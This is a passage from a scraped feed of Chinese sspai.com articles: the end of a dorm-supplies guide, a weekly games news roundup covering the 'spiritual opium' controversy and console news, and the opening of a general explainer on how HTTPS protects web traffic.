class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449ahtb34tar307ksig.png\"></figure><p>考虑到大面积皮肤的防晒霜涂抹起来比较麻烦，大家也可以选择防晒喷雾来进行大面积皮肤的防晒。防晒喷雾可以快速在洒在皮肤上，形成防晒屏障。当然脸部也可以用防晒喷雾，就是使用方法上有所不同，不要直接喷洒，避免呼吸道刺激。还有，不管是什么防晒霜，都需要成膜之后才会起作用。如果需要后续上妆，也需要防晒成膜之后，基本的判断方法就是皮肤上会有一层稍亮，有点油的的薄薄的膜感。成膜时间一般在涂抹之后的 2 分钟到 5 分钟之间，不同防晒霜成膜时间会有略微的不同。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449ai5b34tarbb3pjsg.png\"></figure><h3>水桶/水盆</h3>\n<p>水桶和水盆放在应对天气里可能乍一看比较奇怪，但是别忘了，在台风等极端天气的情况下，有一定概率会停水。作为知名停水停电大学的学生，@Sharon大橘子 幸运地有过台风天停水一整天，靠着宿舍里唯一一个南方同学的一桶水勉强生活的经历。「感谢那位同学，从此我看她的目光里都有了崇拜的意味。」她如是说道。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449aidb34tar307ksj0.png\"></figure><p>水桶最好提手部分比较坚固的，这样在储满水之后移动水桶的时候可以承受住水的重量。水桶本身也比其他储水的工具占平面面积小一些，而且在不用的时候可以垒在一起，节省宿舍的收纳空间。水盆虽然储水空间有限，而且占平面比较大，可是有总比没有强。停水的日子哪怕多一杯水也是很珍贵的。所以请大家务必提前购置，最好带盖，以应对台风天以及学校不知道为什么挖断水管的停水。此外，水盆还有一个额外的用途。在白蚁的繁殖季，你可能在各处见到扑闪着翅膀的白蚁，如果你的室友不知道紧闭门窗的重要性，不小心把白蚁放进了屋子，可以利用白蚁的趋光性，在水盆接满水之后，用光把白蚁引到水盆处，进行诱杀。当然，这些土方法还是比不上杀虫剂，但在晚上睡前，人无法离开进行喷药消杀时，可以应急使用。</p>\n<p>你还有什么在宿舍生活的心得？欢迎在评论区一起交流分享，顺便说说你用过的宿舍好物和有效的杀虫剂吧。</p>\n<p>注：本文图像均来自各品牌旗舰店或官网</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/66917\" target=\"_blank\">东西我都装好了｜由极致性价比打造的宿舍收纳系统</a></li>\n<li><a href=\"https://sspai.com/post/68027\" target=\"_blank\">掌控湿度、凉爽一夏：送给受不了 105 度的你</a></li>\n<li><a href=\"https://sspai.com/post/62912\" target=\"_blank\">无限桌面 | 宿舍书桌改造历程 —— 我的不将就</a></li>\n<li><a href=\"https://sspai.com/post/62437\" target=\"_blank\">初入大学少踩坑，不妨看看这份来自学长的清单</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68067"},{"title":"瞎玩菌的游戏周报：游戏是「精神鸦片」还是文化出口重点？","date":"2021-08-06 06:29:17","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2021.8.6 尽量每周五更新</p>\n<p>《瞎玩菌的游戏周报》是我对游戏领域的观察和点评。具有以下特点：</p>\n<ul>\n<li>宁缺毋滥，为读者带来价值</li>\n<li>主观，但基于事实和数据</li>\n<li>有新鲜感，但时效性不强</li>\n<li>享受游戏，但反对沉迷游戏</li>\n<li>提升品位，但反对鄙视链</li>\n</ul>\n<h2>享乐</h2>\n<p>「享乐（yuè ）」版块是为了推荐好的游戏音乐，「享」字体现「分享」音乐和「享受」音乐两重意思。我衷心希望也许有人因为音乐从而对游戏产生兴趣（我就是）。也欢迎读者评论推荐你们喜欢的游戏音乐，我将会在后续的游戏周报中分享。</p>\n<h3>《Death's Door》 - David Fenn</h3>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/04/9150cf1736ba02c9f867121b657c88eb.jpg\"></figure><p>你可以在 <a href=\"https://davidfennmusic.bandcamp.com/album/deaths-door\">Bandcamp</a> | <a href=\"https://www.youtube.com/watch?v=mvAsrHEtO4c\">Youtube</a> 收听这首音乐（来自同名游戏《死亡之门》，你可以在 <a href=\"https://store.steampowered.com/app/894020?utm_source=mothership&amp;utm_medium=button&amp;utm_campaign=organic&amp;utm_term=Wishlist+on+Steam\">Steam</a> | <a href=\"https://www.xbox.com/en-US/games/deaths-door\">Xbox</a> 上找到这款游戏），根据我的搜索，这首音乐没有在其他音乐平台上架。为方便你在文章页面内直接播放，下面是这首音乐的在线播放版本：</p> <h2>要闻</h2>\n<p>「要闻」版块为你带来游戏领域最重要的话题性事件，除了展示足够丰富的细节，还有我主观的点评、吐槽或提问。游戏本身就是一种互动娱乐，我非常鼓励读者通过评论互动的方式，参与到话题中来，而不是仅仅当个「读」者。</p>\n<h3>央媒批网游为「精神鸦片」，商务部将《原神》《明日方舟》列为国家文化出口重点项目</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/d9ad03f2ec5983954f9f7257c1e4323a.jpg\"></figure><p>新华社《经济参考报》于 8 月 3 日早上 7 点左右发文《<a href=\"http://www.jjckb.cn/2021-08/03/c_1310104012.htm\">「精神鸦片」竟长成数千亿产业</a>》。原文已删除，因此链接现已失效，但是你可以在 <a href=\"https://web.archive.org/web/20210803015523/http://www.jjckb.cn/2021-08/03/c_1310104012.htm\">网页时光机</a> 查看历史网页快照来阅读全文。</p>\n<p>文中点名批评了《王者荣耀》，并以此为例痛批整个网游产业，用到了「精神鸦片」「电子毒品」这样的词来形容游戏。没想到央媒使用「<a href=\"https://www.gmw.cn/01gmrb/2000-05/09/GB/05%5E18415%5E0%5EGMA2-013.htm\">电子海洛因</a>」一词形容游戏的 20 年后，我们又看到了同样的词。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/57dabfc05c097c4562173e2b4570747d.jpg\"><figcaption>图右：《经济参考报》眼中的游戏玩家</figcaption></figure><p>此文一出，多家有游戏业务的上市公司股票暴跌，腾讯控股跌超 10%，网易跌超 15%，心动公司跌超 21%，哔哩哔哩跌超 13%，中手游跌超 22%。新华社「狠起来连自家人都杀」，这些中国企业的市值瞬间就「杀」掉了数千亿，光腾讯一家的市值就损失了约 2600 亿。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/8a0240d3a1755acd4973198c4a443fde.jpg\"><figcaption>在游戏周报，你甚至能看到股票信息</figcaption></figure><p>要知道就在不久前，商务部发布了《<a href=\"http://www.mofcom.gov.cn/article/zwgk/gztz/202107/20210703180727.shtml\">关于公示 2021 - 2022 年度国家文化出口重点企业和重点项目名单的通知</a>》，其中《原神》《明日方舟》被列为了国家文化出口重点项目，而腾讯和米哈游都被列为了国家文化出口重点企业。</p>\n<p>如果游戏是「精神鸦片」「电子毒品」，那我们国家出口这些游戏岂不是等同于「贩毒」？而且还是「跨境贩毒」。游戏公司的老板们一觉醒来，却发现自己变成了「毒枭」？心动网络的 CEO <a href=\"https://www.zhihu.com/question/476894720/answer/2036208869\">黄一孟</a> 就对此非常不爽：</p>\n<blockquote>\n<p>身为游戏行业一员，欢迎媒体监督。未成年人的保护也是全行业，包括企业和家长在内所有人义不容辞的责任。</p>\n<p>但是「精神鸦片」这用词，不但伤害极大，侮辱性更是极强。</p>\n</blockquote>\n<p>在引起强烈的经济和社会反响之后，原文仅存活了 4 个小时就被删除。</p>\n<p>即使文章删除，在文章发布 5 小时后，腾讯游戏就发布了《<a href=\"https://mp.weixin.qq.com/s/65RUvnhl4HzOHhEk9Lgz4Q\">腾讯推出游戏未保「双减双打」新措施</a>》。为了保护未成年人，腾讯将从《王者荣耀》试点，逐步面向全线游戏推出「双减、双打、三提倡」的七条新举措。在新措施中，腾讯甚至给《王者荣耀》玩家口中常常提及的「小学生」下了官方定义，即「未满 12 周岁未成年人」。具体措施的细节如下。</p>\n<p>双减：</p>\n<ol>\n<li>减时长：将执行比政策要求更严厉的未成年用户在线时长限制，非节假日从 1.5 小时降低至 1 小时，节假日从 3 小时减到 2 小时。</li>\n<li>减充值：未满 12 周岁未成年人（「小学生」）禁止在游戏内消费。</li>\n</ol>\n<p>双打：</p>\n<ol>\n<li>打击身份冒用：针对未成年人冒充成年人游戏的情况，将原来的“零点巡查”升级为“全天巡查”，可疑账户全部重新认证。</li>\n<li>打击作弊：积极配合政策，打击用户通过加速器登陆及部分第三方平台买卖成年人帐号的行为。</li>\n</ol>\n<p>三倡议：</p>\n<ol>\n<li>倡议全行业进一步强化游戏防沉迷系统，控制未成年人游戏总时长。</li>\n<li>倡议深化对游戏适龄评定和实施机制的研究。</li>\n<li>倡议全行业讨论全面禁止未满 12 周岁小学生进入游戏的可行性。</li>\n</ol>\n<p>在腾讯游戏提出这些举措之后，《经济参考报》又在当天晚上 18 点左右恢复了删除掉的文章，但是文章标题变成了《<a href=\"http://www.jjckb.cn/2021-08/03/c_1310105032.htm\">网络游戏长成数千亿产业</a>》，并删除了「精神鸦片」「电子毒品」等词汇，仿佛就当没事发生过。</p>\n<p>各位读者不妨说说看，在你眼中，现在什么才算是「精神鸦片」？</p>\n<h2>简讯</h2>\n<p>「简讯」版块是为了控制游戏周报的篇幅，并保持足够的信息量。大部分时候瞎玩菌尽量用一句话浓缩信息，也可能不止一句话。感兴趣的读者可以点击每条新闻末尾的链接符号 🔗 以了解更多信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/dc8f0d5f75494dab142e5b5e5061de1e.jpg\"><figcaption>J. Allen Brack</figcaption></figure><ul><li>暴雪性骚扰丑闻持续扩大影响，暴雪总裁 J. Allen Brack 宣布离职。之后，人力资源部门的总管 Jesse Meschuk 也离开暴雪。关联阅读：其乐社区的文章《<a href=\"https://keylol.com/t737947-1-1\">暴雪的名声如何在三年内跌落谷底</a>》。 <a href=\"https://news.blizzard.com/en-us/blizzard/23706475/new-leadership-at-blizzard\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/a24952e0ad4ebfa75017f0832041408d.jpg\"></figure><ul><li>PS5 测试版固件支持升级 M.2 固态硬盘。根据索尼的文档中给出的规格要求，玩家需要一块 PCIe Gen4 接口的 M.2 固态硬盘，并且读取速度至少有 5500 MB/s。 <a href=\"https://www.playstation.com/en-us/support/hardware/ps5-install-m2-ssd/#min\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/52df73d58a5c4820e35c4b8d2f34ebf1.png\"></figure><ul>\n<li>PS5 可用的 M.2 固态硬盘具体品牌和型号，推荐参考机核网的《<a href=\"https://www.gcores.com/articles/139821\">PS5加装M.2 SSD教程兼硬盘选购指南</a>》，The Verge 的《<a href=\"https://www.theverge.com/22602046/best-ps5-playstation-5-m2-ssd-compatible-drives\">The PS5 SSD buying guide</a>》，文中涉及的主要产品有希捷旗下的 FIRECUDA 530，还有 PS4 / PS5 首席架构师 <a href=\"https://twitter.com/cerny/status/1421686135936348161\">Mark Cerny</a> 推荐的西数黑盘 SN850，读取速度为 7000 MB/s，售价约 1.2 元 / GB。这些产品的售价让人无法不冷静下来，建议玩家们理性消费，看看就好。 ​​<a href=\"https://twitter.com/cerny/status/1421686135936348161\">🔗</a>\n</li>\n<li>索尼互动娱乐宣布 PS5 在全球已经销售超过 1000 万台。不过瞎玩菌更关心的数据是，中国玩家买走了多少台？国行版占了多少台？黄牛手里捏着多少台？ <a href=\"https://www.sie.com/en/blog/a-new-milestone-sie-sells-10-million-playstation-5-consoles-globally/\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/c3cad00f0889d9f2ce1ff7d90c91a156.png\"><figcaption>过去一年的股票走势：蓝线为微软，黄线为苹果（作为对比）</figcaption></figure><ul><li>在游戏周报，你甚至能看到财经新闻，这主要是因为各大公司都在近期公布季度财报。微软公布了 2021 财年第 4 季度财报（截止 2021 年 6 月 30 日），公司总收入为 462 亿美元，相比去年同期增长了 21%。游戏业务收入增加了 3.57 亿美元，增长了 11%，主要归因于 Xbox 硬件的增长，但游戏内容和服务收入下降 4% （1.28 亿美元）导致抵消了一部分增长。由于 Xbox Series X|S 的推出，游戏机的价格和销量增加，Xbox 硬件收入增长 172%。 <a href=\"https://www.microsoft.com/en-us/Investor/earnings/FY-2021-Q4/press-release-webcast\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/6af9683f88400442370c80ab70a39d09.jpg\"></figure><ul><li>Xbox 公布了颜值超高的水蓝色（Aqua Shift）手柄，定价 69.99 美元，将于 9 月 1 日发售。这款标准手柄的握把首次采用了橡胶部件（之前都是塑料），来实现更好的握持感，参见下图。 <a href=\"https://twitter.com/Xbox/status/1422558269051084808\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/a9df2e93f82dd7647d397856ac9e10d0.jpg\"><figcaption>橡胶材质的握把</figcaption></figure><ul><li>玩家张小北热衷汉化日本「黄油」，搭建网站（下图）成立汉化组，共汉化游戏 170 部，牟利 140 多万元。4 月 20 日，江苏无锡梁溪分局网安大队将其抓捕归案。全国「扫黄打非」办将此案列入「净网 2021」专项行动查办的首批典型案件。 <a href=\"https://weibo.com/5431447659/KrzgA4UN3\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/7dd553476b389cca2d6970fcbdba6e38.jpg\"><figcaption>图源 <a href=\"https://weibo.com/5431447659/KrzgA4UN3\">微博 江苏网警</a></figcaption></figure><ul><li>2021 ChinaJoy 展览和会议现场所有人员需要持有 7 日内有效核算检测阴性报告，方可入场。本届 ChinaJoy 7 月 30 日开展 ，但主办方在 7 月 29 日才发公告提出这个要求，这招致众多已购票观众的吐槽。 <a href=\"https://weibo.com/1798143541/KqUBpmdkp\">🔗</a>\n</li></ul> <p> </p>\n<ul>\n<li>Steam Deck 公布了新的演示视频，在视频中，Valve 的工程师向 IGN 展示了Steam Deck 主机独特的触摸板和陀螺仪控制。 <a href=\"https://www.bilibili.com/video/bv1qv411E7Dr\">🔗</a>\n</li>\n<li>任天堂回应了 Switch OLED 机型确实存在「烧屏」的问题，具体是指 OLED 在长期停留在一个静态画面时，屏幕上会有残留影像。 <a href=\"https://www.cnet.com/tech/computing/worried-about-nintendo-switch-oled-burn-in-read-this-first/\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/df0f3ccfba542da713fe6f25320c2ca3.jpg\"></figure><ul><li>That's No Moon 工作室成立，成员阵容豪华，来自 Infinity Ward、顽皮狗、PlayStation、圣莫妮卡、Bungie 等游戏一线大厂。该工作室将专注于制作故事驱动的单人游戏。让我们记住这个 logo，看看他们能拿出什么让玩家惊喜的游戏。 <a href=\"https://thatsnomoon.com/\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/08d29d7f50cc85efdc6956c6165fd1e7.jpg\"></figure><ul>\n<li>《仙剑奇侠传七》公布了实体版并开启预售，10 月 15 日上市，游戏分为三档定价：数字版 128 元，标准版 138 元，豪华版 399 元。还有《仙剑奇侠传七官方设定美术全集》定价 328 元。 <a href=\"http://pal7.cubejoy.com/intro.html\">🔗</a>\n</li>\n<li>中手游以 6.4184 亿港元收购大宇旗下子公司北京软星，以及《仙剑奇侠传》IP 在大陆地区所有权益。 <a href=\"https://image.shengli.com/www_cmge_com/uploads/pdf/20210805/1628175309_1361610889.pdf\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/66e89ee6347be077ac8859b3cac5e4fd.jpg\"></figure><ul><li>PlayStation 中国宣布《麻布仔大冒险》国行版即将于 8 月 17 日登陆 PS4｜PS5 平台。 <a href=\"https://weibo.com/2833736934/Kr705yY9C\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/1c327c01f538401aa4102e21b0d16269.jpg\"></figure><ul><li>腾讯 Nintendo Switch 的国行独占游戏《疯狂兔子：奇遇派对》现已发售，定价 299 元。 <a href=\"https://weibo.com/7229718199/Ks1vEdrEt\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/a15785d177c98e4b9656a3285597d36e.jpg\"></figure><ul><li>Xbox Game Pass 8 月游戏阵容新增《黑帝斯》《无间冥寺》等。 <a href=\"https://twitter.com/XboxGamePass/status/1422543986384793603?s=20\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/fe02416231952b477c2f74f75fc2d343.jpg\"></figure><ul><li>PlayStation Plus 8 月会免游戏阵容公布，含《植物大战僵尸：为好邻镇而战》《世界网球巡回赛 2》《猎人竞技场：传奇》3 款游戏。 <a href=\"https://twitter.com/PlayStationHK/status/1420579842400178178?s=20\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/d4a3853aa8cf9b40f2ac2942736e044f.jpg\"></figure><ul>\n<li>国产叙事解谜游戏《完美的一天》发布序章，可以免费玩。 <a href=\"https://store.steampowered.com/app/843810/_/\">🔗</a>\n</li>\n<li>《艾尔登法环》上架 Steam 页面，2022 年 1 月 21 日发售，支持中文。 <a href=\"https://store.steampowered.com/app/1245620/_/\">🔗</a>\n</li>\n<li>《伊迪丝·芬奇的记忆》（What Remains of Edith Finch）将于 8 月 16 日登陆 iOS 平台。 <a href=\"https://www.engadget.com/what-remains-of-edith-finch-ios-release-date-192428137.html\">🔗</a>\n</li>\n<li>《对马岛之鬼 导演剪辑版》放出了几张壹岐岛的新截图，如下。 <a href=\"https://twitter.com/PlayStation/status/1420421290633007104\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/b76d0b3faa93dc1a96a5615532097454.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/50f4a82af05e16c91366b38c0c59c3c4.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/8fe9387d67f9ea4f093c27835fcc7da0.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/8cfca2374db7ee9bfa8d0b431b6deeb5.jpg\"></figure><h2>彩蛋</h2>\n<p>「彩蛋」版块旨在分享有趣或有料的游戏相关内容，但不是严肃的游戏新闻。内容来源不限于玩家社群，MOD，二创，同人或 ACG 衍生的亚文化等。</p>\n<h3>🌈🥚1 《GTA V》「写实主义」 MOD 集，打造超现实画质</h3>\n<p>效果先看图，不说谁知道是游戏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/42ab6d4422eec832747cc1742c4362e3.jpg\"></figure><p>这位玩家在视频（<a href=\"https://www.youtube.com/watch?v=bJpj4mb8Ydk\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1Rg41177iC/\">哔哩哔哩</a>）中使用了多个 MOD，把游戏各项设置拉满，通过 GeForce RTX™ 3090 OC + Ryzen™ 7 5800X + 32GB 内存的硬件配置来达到这一效果。</p> <p>大概《GTA 6》就是这个效果吧？</p>\n<h3>🌈🥚2 英国食品店 <a href=\"https://twitter.com/krispykremeUK?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1420289168920485890%7Ctwgr%5E%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.theverge.com%2Ftldr%2F2021%2F7%2F28%2F22597592%2Fkrispy-kreme-xbox-doughnut-donut-uk\">Krispy Kreme</a> 开卖 Xbox 甜甜圈</h3>\n<p>每买一打甜甜圈，Krispy Kreme 就会送一个月的Xbox Game Pass Ultimate。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/62a2e335ae95e3d647b88e27f7ae85e5.jpg\"></figure><h3>🌈🥚3 《最终幻想 14》官方菜谱上架</h3>\n<p>你可以在 <a href=\"https://store.na.square-enix-games.com/en_US/product/679036/the-ultimate-final-fantasy-xiv-cookbook-book\">SE 官方商店</a> | <a href=\"https://www.amazon.com/Licensed-Video-Cookbook-Insight-Editions/dp/1647225116\">Amazon</a> 预购这本书，定价 35 美元，共 192 页，今年 11 月正式发售。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/7c9b4898fd76cb3ae6e8d3b4f9d1ab10.jpg\"><figcaption>图书封面</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/645ff60d5ee7d0308e8eeebc1f821e69.jpg\"><figcaption>渡渡鸟蛋包饭</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/051adf8130aa217807f8191c42d68e5c.jpg\"><figcaption>星光渡渡鸟</figcaption></figure><h3>🌈🥚4 推荐一篇由其乐社区@秋忆殇陌离 翻译的文章《<a href=\"https://keylol.com/t736379-1-1\">好评如潮的&lt;生化奇兵：无限&gt;背后鲜为人知的开发秘辛</a>》</h3>\n<p>从文中可以看出这个伟大游戏的背后，开发工作进行得多么艰难。</p>\n<p>同时瞎玩菌也特别推荐这款游戏，尤其是里面的伙伴 NPC 伊丽莎白，是我见过做得最好的游戏 NPC 之一，同时代在智能程度上能够与之媲美的只有《最后生还者》里的小女孩艾莉。</p>\n<h3>🌈🥚5 国外玩家 Nassim's Software 制作了《塞尔达传说：旷野之息》的街景地图</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/2476801821d6ebe9e3ef778d24026b3b.png\"></figure><p>你可以在 <a href=\"https://nassimsoftware.github.io/zeldabotwstreetview/\">这里</a> 访问这张地图。</p>\n<p>你可以像使用现实中的街景地图软件一样，点击查看《塞尔达传说：旷野之息》中的场景，并且以 360 度视角自由观看全景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/a021bf0d5ce35bfa9c97c80ec7cea906.gif\"><figcaption>猜猜我在哪？</figcaption></figure><p>这位玩家还把制作过程做成了视频（<a href=\"https://www.youtube.com/watch?v=EYtB1rkwcfU\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1rq4y1D71z/\">哔哩哔哩</a>）。</p> <h2>读者互动</h2>\n<p>上期游戏周报发布后，通过瞎玩菌对各个发布渠道和游戏读者群中的调查，收到了很多有价值的反馈意见。汇总了读者们的意见后，多数读者还是更喜欢把游戏音乐推荐的版块放在文章开头，便于边听音乐边读文章。所以我尊重大家的选择，以后会继续把音乐放在开头。同时也有读者提出了其他改进意见：</p>\n<ul>\n<li>希望以后能给出国内音乐服务的收听链接，因为自己没有购买 Spotify 会员，所以免费用户每首音乐只能收听 30 秒。</li>\n<li>文中经常有视频，播放视频时会打断音乐，需要先暂停音乐再播放视频，操作有点繁琐。</li>\n</ul>\n<p>这些意见都很合理，对于后者我暂时没有什么好的办法，但是前者我会采纳，以后我会同时给出国内音乐服务的链接（如果有的话），例如 QQ 音乐、网易云音乐。但是 Apple Music 用户可能要失望了，因为我没有订阅用不了。要是订阅了 Apple Music 的读者如果能在评论中分享一下对应音乐的链接就好了。</p>\n<p>📧 纠错/反馈/提问 Email：<a href=\"mailto:xatest@gmail.com\" target=\"_blank\">xatest@gmail.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68102"},{"title":"聊聊浏览器里的那把锁：HTTPS 如何让你安全冲浪？","date":"2021-08-06 02:59:32","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>多年以前，我还在上大学的时候，曾经听学长说起他打过的一份工，每个月可以赚不少零花钱。这份工作非常简单，就是去互联网上流行的各种网站、手机上流行的各大 APP 以及各个网站的手机浏览器版本（WAP、H5 之类的）执行一些基本的操作，包括注册、登录、操作具体业务等，比如航空类的网站就尝试查询航班、购买机票，团购类的网站就尝试搜索美食、发布评价……</p>\n<p>在操作的同时，通过 Wireshark 这样的抓包软件把所有的通信包全部记录下来并分析其中的 HTTP 数据，你会发现账号、业务内容等信息绝大部分都以明文形式在互联网上流动，即使少部分看起来是乱码，经过简单的解码、解密，也可以快速获取原文。</p>\n<p><strong>学长告诉我这样的世界太不安全了</strong>：想要通过互联网完成任何一件事情，你都需要从电脑或手机发起一系列 HTTP 请求，这些请求通过一层层的路由，最终送到千里之外的某台服务器。</p>\n<p>在这个过程中，你同宿舍的室友可能在偷看你的聊天，你的学校也可能以安全为由监控着你的行踪，还有一些不法分子在暗中记录你的账号和密码；在这个过程中，许许多多的钓鱼网站通过拦截你的网络，假冒银行、政府，获取你的信任，套取你的信息；在这个过程中，运营商可能为了利益，在你正常浏览的网页中嵌入了生硬的广告，篡改了原始的页面内容……</p>\n<p>直到我们有了 HTTPS —— 它简直就是这一切的「救世主」。</p>\n<h2>HTTP 带来的风险</h2>\n<p>HTTPS，中文名是「超文本传输安全协议」（HyperText Transfer Protocol Secure），它以 HTTP 为基础，为 HTTP 提供额外的加密和认证。这也正是其名字的由来：HTTP + Secure。</p>\n<p>如果我们用日常生活中的交流来模拟 HTTP，那么 <strong>明文的聊天</strong> 可能是这样的：</p>\n<blockquote><p>致少数派：我叫李明，我的密码是 123456；我最近收到了什么新的私信？</p></blockquote>\n<blockquote><p>答复：李明你好，已确认你的身份。昨天张三给你发了一条私信，内容是「天气真好」。</p></blockquote>\n<p>问题在于你和少数派并不是面对面交流的。事实上你跟少数派说的每一句话，都像一张明信片一样，邮局拿到你的明信片，中间经过一层层的邮政网点转发，最终才派送到少数派那儿。少数派给你的答复也是如此。</p>\n<p>这样至少就带来以下风险：</p>\n<ol>\n<li>\n<strong>明信片嘛，所有邮递员都可以看到</strong>。大家不但知道了你的私信内容，大家甚至知道了你的姓名和密码</li>\n<li>\n<strong>你虽然收到了一个答复，但是你无法确定到底是不是少数派给出的</strong>。万一哪个邮递员懒得（或者故意不去）送你的明信片，而自己随便写了一条私信回给你呢？</li>\n<li>\n<strong>内容可能被篡改</strong>。邮递员完成了派送，也成功取回了少数派给你的答复。但是少数派回复的私信内容明明是「天气真好」，有个捣蛋的邮递员把它改成了「天气真不好」</li>\n</ol>\n<h2>HTTPS 的互相问候</h2>\n<p>引入 HTTPS 之后情况就完全不一样了，虽然仍然使用明信片进行交流，但是这次你和少数派之间首先有个见面的问候：</p>\n<blockquote>\n<p>致少数派：</p>\n<p>我需要访问私信；</p>\n<p>我懂得使用 TLS_RSA_WITH_AES_256_GCM_SHA384 算法、 TLS_RSA_WITH_AES_128_GCM_SHA256 算法，你选一个；</p>\n<p>我生成了一个随机数，11872</p>\n</blockquote>\n<p>当然，实际使用时的信息会再多一些，这里只选取了其中最重要的几个。它们分别是：</p>\n<ol>\n<li>所需访问的网站</li>\n<li>我所支持的算法</li>\n<li>我生成的随机数</li>\n</ol>\n<p>少数派拿到你的信息之后，会根据自身情况做出答复：</p>\n<blockquote>\n<p>答复：</p>\n<p>我们就用 TLS_RSA_WITH_AES_256_GCM_SHA384 算法吧；</p>\n<p>我也生成了一个随机数，785391；</p>\n<p>给你私信网站的证书（一个文件袋）</p>\n</blockquote>\n<p>少数派给的答复也比我所举的例子复杂得多，这里选取的几项分别是：</p>\n<ol>\n<li>从你所给的几种算法中挑了一种，双方都合适的</li>\n<li>也生成了一个随机数</li>\n<li>给了你所需网站的证书</li>\n</ol>\n<p>HTTPS 的安全通道尚未建立，但是我们有必要先来看一下这张证书。</p>\n<h2>证书，一个文件袋</h2>\n<p>经过和少数派的第一次通信，你拥有了一张证书；或者说是一个文件袋，里面装满了各种文件，可供查验和使用。你可以在任何浏览器中看到这张证书。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/793bee884976d48ac2747b596b3ca28c.png\"></figure><p>例如使用 Google Chrome 打开少数派网站，地址栏的左侧会出现一把小锁。点击之后，可以查看证书的详细情况：</p>\n<figure class=\"image ss-img-wrapper\"><img 